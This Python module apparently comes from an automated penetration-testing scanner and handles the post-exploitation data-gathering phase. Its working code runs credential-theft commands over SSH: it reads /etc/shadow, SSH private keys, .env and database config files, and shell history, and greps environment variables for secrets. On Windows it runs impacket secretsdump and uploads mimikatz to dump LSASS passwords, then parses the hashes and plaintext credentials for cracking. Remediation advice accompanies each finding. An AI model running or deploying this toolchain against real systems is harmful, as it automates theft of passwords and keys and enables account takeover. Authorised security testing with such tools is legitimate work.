"""
Data Gathering module — Phase 8.4.
After shell access: dumps /etc/shadow, SAM/NTDS.dit (impacket secretsdump),
LSASS (mimikatz), DB configs, SSH keys, history files.
Passes found hashes to hash_crack module.
Only runs on scan_type == 'full'.
"""
from __future__ import annotations

import re
import shutil
import tempfile
from pathlib import Path
from typing import TYPE_CHECKING

from app.scanner.base import Finding, ScanResult
from app.scanner.post_exploit import _ssh_exec, _ssh_upload_exec, _extract_ssh_sessions, _is_windows

if TYPE_CHECKING:
    from app.scanner.context import ScanContext


# ── Linux data gathering ──────────────────────────────────────────────────────

_LINUX_COMMANDS: list[tuple[str, str, str, str, float]] = [
    # (shell_cmd, key, title, remediation, base_cvss)
    (
        "cat /etc/passwd",
        "etc_passwd",
        "/etc/passwd — system user list",
        "Restrict /etc/passwd to root:root 644. Disable unused system accounts.",
        4.3,
    ),
    (
        "cat /etc/shadow 2>/dev/null",
        "etc_shadow",
        "/etc/shadow — password hashes",
        "Restrict /etc/shadow to root:shadow 640. Rotate all credentials immediately.",
        9.8,
    ),
    (
        "find /home /root -name 'id_rsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' 2>/dev/null | head -10 | xargs cat 2>/dev/null",
        "ssh_keys",
        "SSH private keys found",
        "Rotate all exposed SSH keys immediately. Set permissions: chmod 600 ~/.ssh/id_*. Use hardware tokens.",
        9.1,
    ),
    (
        "find / -maxdepth 6 -name 'wp-config.php' -o -name '.env' -o -name 'database.yml' "
        "-o -name 'settings.py' -o -name 'config.php' -o -name 'db.config' "
        "-o -name 'application.properties' -o -name 'appsettings.json' 2>/dev/null | head -15 | xargs cat 2>/dev/null",
        "db_configs",
        "Database/app config files with credentials",
        "Move secrets to a vault (HashiCorp Vault, AWS Secrets Manager). Never store credentials in flat files.",
        9.1,
    ),
    (
        "cat ~/.bash_history ~/.zsh_history ~/.sh_history /root/.bash_history 2>/dev/null | grep -E 'pass|key|token|secret|mysql|psql|mongo' | head -30",
        "shell_history",
        "Credentials found in shell history",
        "Clear history: `history -c && > ~/.bash_history`. Disable HISTFILE for privileged sessions.",
        7.5,
    ),
    (
        "find / -maxdepth 5 -name '*.pem' -o -name '*.key' -o -name '*.pfx' -o -name '*.p12' 2>/dev/null | head -10",
        "cert_keys",
        "Certificate/key files found",
        "Restrict access to certificate files. Rotate any exposed TLS private keys.",
        7.5,
    ),
    (
        "env | grep -iE 'pass|key|token|secret|api|aws|db_|database' 2>/dev/null",
        "env_secrets",
        "Secrets in environment variables",
        "Clear secrets from env. Use secret manager integrations. Audit startup scripts.",
        8.1,
    ),
    (
        "find / -maxdepth 4 -name '.git' -type d 2>/dev/null | head -5 | xargs -I{} sh -c 'cd \"{}\" && git log --oneline -5 2>/dev/null'",
        "git_history",
        "Git repositories found — possible secret leaks",
        "Scan with gitleaks/trufflehog. Rotate any secrets found. Use .gitignore for sensitive files.",
        6.5,
    ),
    (
        "crontab -l 2>/dev/null; cat /etc/cron* /etc/cron.d/* /var/spool/cron/crontabs/* 2>/dev/null | head -40",
        "cron_jobs",
        "Cron jobs — credential/path leaks",
        "Audit cron entries. Remove credentials from cron scripts. Use env file patterns instead.",
        5.3,
    ),
    (
        "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null | head -30",
        "open_sockets",
        "Internal services listening (post-shell view)",
        "Close unnecessary listening services. Firewall internal ports.",
        4.3,
    ),
]

# Sensitive patterns that upgrade severity to critical
_CREDENTIAL_RE = re.compile(
    r"(?:password|passwd|pwd|secret|api.?key|token|db.?pass|database_url)\s*[=:]\s*\S+",
    re.IGNORECASE,
)
_SHADOW_HASH_RE = re.compile(r"^[^:]+:(\$[0-9][a-z]?\$[^\s:]+):", re.MULTILINE)
_PRIVATE_KEY_RE = re.compile(r"-----BEGIN (?:RSA|EC|OPENSSH) PRIVATE KEY-----")


async def _gather_linux(
    ctx: "ScanContext",
    target: str,
    host: str,
    user: str,
    password: str,
) -> list[Finding]:
    findings: list[Finding] = []
    shadow_hashes: list[str] = []

    for cmd, key, title, remediation, base_cvss in _LINUX_COMMANDS:
        ok, output = _ssh_exec(host, user, password, cmd, timeout=20)
        if not ok or not output.strip():
            continue

        cvss = base_cvss
        severity_map = {9.0: "critical", 7.0: "high", 4.0: "medium"}
        severity = "info"
        for threshold, sev in sorted(severity_map.items(), reverse=True):
            if cvss >= threshold:
                severity = sev
                break

        # Upgrade severity if output contains live credentials
        if _CREDENTIAL_RE.search(output) or _PRIVATE_KEY_RE.search(output):
            severity = "critical"
            cvss = max(cvss, 9.8)

        # Collect /etc/shadow hashes for later cracking
        if key == "etc_shadow":
            shadow_hashes.extend(_SHADOW_HASH_RE.findall(output))

        await ctx.log(f"data_gather: [{key}] found on {host}", module="data_gather")

        findings.append(Finding(
            type="postex",
            title=title,
            severity=severity,
            description=(
                f"Data gathered from {target} (user: {user}).\n"
                f"Command: {cmd}\n\n"
                f"Output (truncated):\n{output[:600]}"
            ),
            evidence=output[:500],
            remediation=remediation,
            cvss_score=cvss,
        ))

    # Add shadow hashes as a separate finding for hash_crack to pick up
    if shadow_hashes:
        findings.append(Finding(
            type="postex",
            title=f"/etc/shadow: {len(shadow_hashes)} password hash(es) extracted",
            severity="critical",
            description=(
                f"Password hashes from /etc/shadow on {target}:\n"
                + "\n".join(shadow_hashes[:10])
            ),
            evidence="\n".join(shadow_hashes[:10]),
            remediation=(
                "Immediately rotate all user passwords. "
                "Restrict /etc/shadow permissions (root:shadow 640). "
                "Enable PAM strong password policy."
            ),
            cvss_score=9.8,
        ))

    return findings


# ── Windows: impacket secretsdump ─────────────────────────────────────────────

async def _run_secretsdump(
    ctx: "ScanContext",
    target: str,
    host: str,
    user: str,
    password: str,
    domain: str = ".",
) -> list[Finding]:
    tool = shutil.which("secretsdump.py") or shutil.which("impacket-secretsdump")
    if not tool:
        await ctx.log("data_gather: impacket secretsdump not found", level="warning", module="data_gather")
        return []

    await ctx.log(f"data_gather: secretsdump on {host} as {domain}\\{user}", module="data_gather")

    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
        out_file = f.name

    try:
        from app.scanner.base import run_cmd
        rc, stdout, stderr = run_cmd(
            [tool, f"{domain}/{user}:{password}@{host}", "-outputfile", out_file],
            timeout=120,
        )
        combined = stdout + stderr

        # Parse NTLM hashes: Administrator:500:aad3...:31d6...::: pattern
        ntlm_re = re.compile(r"^([^:]+):\d+:[a-fA-F0-9]{32}:([a-fA-F0-9]{32}):::", re.MULTILINE)
        hashes = ntlm_re.findall(combined)

        # Parse plaintext (if Kerberos/LSA secrets dumped)
        plain_re = re.compile(r"_SC_[^\n]+\n([^\n]+)", re.IGNORECASE)
        plaintext = plain_re.findall(combined)
    finally:
        Path(out_file + ".sam").unlink(missing_ok=True)
        Path(out_file + ".ntds").unlink(missing_ok=True)
        Path(out_file + ".secrets").unlink(missing_ok=True)
        Path(out_file + ".cached").unlink(missing_ok=True)
        Path(out_file).unlink(missing_ok=True)

    if not hashes and not plaintext:
        return []

    findings: list[Finding] = []

    if hashes:
        hash_lines = [f"{u}::{h}" for u, h in hashes[:20]]
        findings.append(Finding(
            type="postex",
            title=f"SAM/NTDS dump: {len(hashes)} NTLM hash(es) extracted",
            severity="critical",
            description=(
                f"impacket secretsdump dumped {len(hashes)} NTLM hash(es) from {target}.\n"
                f"Sample hashes (first 5):\n" + "\n".join(hash_lines[:5])
            ),
            evidence="\n".join(hash_lines[:10]),
            remediation=(
                "Immediately rotate all Windows account passwords. "
                "Enable Windows Defender Credential Guard. "
                "Disable NTLMv1. Deploy LAPS for local admin accounts."
            ),
            cvss_score=9.8,
        ))

    if plaintext:
        findings.append(Finding(
            type="postex",
            title=f"LSA secrets: {len(plaintext)} plaintext credential(s)",
            severity="critical",
            description=(
                f"LSA secrets extracted from {target}.\n"
                f"Credentials (first 3):\n" + "\n".join(plaintext[:3])
            ),
            evidence="\n".join(plaintext[:5]),
            remediation=(
                "Rotate all service account credentials. "
                "Enable Protected Users security group. "
                "Restrict LSA access with RunAsPPL registry key."
            ),
            cvss_score=9.8,
        ))

    return findings


# ── Windows: mimikatz (via MSF session) ──────────────────────────────────────

_MIMIKATZ_PATH = Path("/opt/mimikatz/x64/mimikatz.exe")


async def _run_mimikatz_msf(
    ctx: "ScanContext",
    target: str,
    session_ids: list[str],
) -> list[Finding]:
    """Run mimikatz sekurlsa::logonpasswords via MSF kiwi extension."""
    if not session_ids:
        return []

    try:
        from pymetasploit3.msfrpc import MsfRpcClient  # type: ignore
        client = MsfRpcClient("msf", port=55553, ssl=False)
    except Exception:
        return []

    findings: list[Finding] = []
    for sid in session_ids[:1]:
        try:
            session = client.sessions.session(sid)
            await ctx.log(f"data_gather: loading kiwi on MSF session {sid}", module="data_gather")

            # Load kiwi (mimikatz) extension
            session.run_with_output("load kiwi", timeout=15)
            output = session.run_with_output("creds_all", timeout=30)

            # Parse plaintext passwords: Username: ... Password: ...
            cred_re = re.compile(
                r"Username\s*:\s+(\S+).*?Password\s*:\s+(\S+)",
                re.IGNORECASE | re.DOTALL,
            )
            creds = cred_re.findall(output)
            # Filter blanks/null
            creds = [(u, p) for u, p in creds if p.lower() not in ("(null)", "null", "")]

            if creds:
                await ctx.log(
                    f"data_gather: mimikatz found {len(creds)} plaintext credential(s)!",
                    level="error", module="data_gather",
                )
                findings.append(Finding(
                    type="postex",
                    title=f"Mimikatz: {len(creds)} plaintext credential(s) from LSASS",
                    severity="critical",
                    description=(
                        f"mimikatz (kiwi) extracted plaintext credentials from LSASS on {target}.\n\n"
                        + "\n".join(f"  {u}: {p}" for u, p in creds[:10])
                    ),
                    evidence="\n".join(f"{u}:{p}" for u, p in creds[:10]),
                    remediation=(
                        "Enable Windows Defender Credential Guard immediately. "
                        "Enable Protected Users group for all privileged accounts. "
                        "Set HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential = 0. "
                        "Rotate all exposed credentials."
                    ),
                    cvss_score=10.0,
                ))
        except Exception as e:
            await ctx.log(f"data_gather: mimikatz session {sid} error: {e}", level="warning", module="data_gather")

    return findings


async def _run_mimikatz_ssh(
    ctx: "ScanContext",
    target: str,
    host: str,
    user: str,
    password: str,
) -> list[Finding]:
    """Upload mimikatz.exe and run sekurlsa::logonpasswords via SSH."""
    if not _MIMIKATZ_PATH.exists():
        return []

    remote = "C:\\Windows\\Temp\\mimi.exe"
    await ctx.log(f"data_gather: uploading mimikatz to {host}", module="data_gather")

    cmd = f"{remote} \"sekurlsa::logonpasswords\" \"exit\""
    ok, output = _ssh_upload_exec(host, user, password, str(_MIMIKATZ_PATH), remote, cmd, timeout=30)
    if not ok:
        return []

    # Parse output
    cred_re = re.compile(r"Username\s*:\s+(\S+).*?Password\s*:\s+(\S+)", re.DOTALL | re.IGNORECASE)
    creds = [(u, p) for u, p in cred_re.findall(output) if p.lower() not in ("(null)", "null", "")]

    if not creds:
        return []

    return [Finding(
        type="postex",
        title=f"Mimikatz: {len(creds)} plaintext credential(s) from LSASS",
        severity="critical",
        description=(
            f"mimikatz extracted plaintext credentials from LSASS on {target}.\n\n"
            + "\n".join(f"  {u}: {p}" for u, p in creds[:10])
        ),
        evidence="\n".join(f"{u}:{p}" for u, p in creds[:10]),
        remediation=(
            "Enable Windows Defender Credential Guard. "
            "Set WDigest UseLogonCredential=0. "
            "Rotate all exposed credentials. "
            "Enable Protected Users group."
        ),
        cvss_score=10.0,
    )]


# ── Windows: additional sensitive files ──────────────────────────────────────

_WINDOWS_COMMANDS: list[tuple[str, str, str, float]] = [
    (
        "type C:\\Users\\*\\AppData\\Roaming\\FileZilla\\recentservers.xml 2>nul & "
        "type C:\\Users\\*\\AppData\\Roaming\\FileZilla\\sitemanager.xml 2>nul",
        "FileZilla saved credentials",
        "Remove saved credentials from FileZilla. Use password manager instead.",
        7.5,
    ),
    (
        "type C:\\Windows\\System32\\config\\SAM 2>nul | head -5 || echo SAM_found",
        "SAM file accessible",
        "Restrict SAM file access. Enable VSS shadow copy protection.",
        9.0,
    ),
    (
        "type C:\\inetpub\\wwwroot\\web.config 2>nul & type C:\\xampp\\htdocs\\config.php 2>nul",
        "Web application config (DB credentials)",
        "Move DB credentials to environment variables or a secrets manager.",
        8.5,
    ),
    (
        "cmdkey /list 2>nul",
        "Stored Windows credentials (cmdkey)",
        "Remove stored credentials: `cmdkey /delete:<target>`. Use certificate auth.",
        7.5,
    ),
    (
        "reg query HKLM\\SOFTWARE\\OpenSSH 2>nul & type C:\\Users\\*\\.ssh\\id_rsa 2>nul",
        "SSH private keys on Windows",
        "Rotate exposed SSH keys. Set correct ACLs: only owner should have read access.",
        8.1,
    ),
]


async def _gather_windows(
    ctx: "ScanContext",
    target: str,
    host: str,
    user: str,
    password: str,
) -> list[Finding]:
    findings: list[Finding] = []

    for cmd, title, remediation, cvss in _WINDOWS_COMMANDS:
        ok, output = _ssh_exec(host, user, password, cmd, timeout=15)
        if not ok or not output.strip() or "not recognized" in output.lower():
            continue

        severity = "critical" if cvss >= 9.0 else ("high" if cvss >= 7.0 else "medium")
        if _CREDENTIAL_RE.search(output):
            severity = "critical"
            cvss = max(cvss, 9.8)

        await ctx.log(f"data_gather: [{title[:40]}] found on {host}", module="data_gather")
        findings.append(Finding(
            type="postex",
            title=title,
            severity=severity,
            description=(
                f"Sensitive data gathered from Windows host {target}.\n"
                f"Command: {cmd}\n\nOutput:\n{output[:600]}"
            ),
            evidence=output[:500],
            remediation=remediation,
            cvss_score=cvss,
        ))

    return findings


# ── Main entry point ──────────────────────────────────────────────────────────

async def run_data_gather(
    ctx: "ScanContext",
    target: str,
    scan_type: str,
    nmap_findings: list[Finding],
    brute_findings: list[Finding],
    msf_findings: list[Finding],
) -> ScanResult:
    result = ScanResult()

    if scan_type != "full":
        return result

    from app.scanner.post_exploit import _extract_msf_sessions
    ssh_sessions = _extract_ssh_sessions(brute_findings)
    msf_sessions  = _extract_msf_sessions(msf_findings)
    is_win        = _is_windows(nmap_findings)

    if not ssh_sessions and not msf_sessions:
        await ctx.log("data_gather: no sessions available", level="warning", module="data_gather")
        return result

    await ctx.log(
        f"data_gather: SSH={len(ssh_sessions)}, MSF={len(msf_sessions)}, Windows={is_win}",
        module="data_gather",
    )

    if ssh_sessions:
        host, user, password = ssh_sessions[0]

        if is_win:
            # Windows via SSH
            win_findings = await _gather_windows(ctx, target, host, user, password)
            result.findings.extend(win_findings)

            # secretsdump
            sd_findings = await _run_secretsdump(ctx, target, host, user, password)
            result.findings.extend(sd_findings)

            # mimikatz via SSH
            mimi_ssh = await _run_mimikatz_ssh(ctx, target, host, user, password)
            result.findings.extend(mimi_ssh)
        else:
            # Linux via SSH
            linux_findings = await _gather_linux(ctx, target, host, user, password)
            result.findings.extend(linux_findings)

    # mimikatz via MSF kiwi (works regardless of SSH)
    if msf_sessions and is_win:
        mimi_msf = await _run_mimikatz_msf(ctx, target, msf_sessions)
        result.findings.extend(mimi_msf)

    total = len(result.findings)
    await ctx.log(f"data_gather: completed — {total} finding(s)", module="data_gather")
    return result
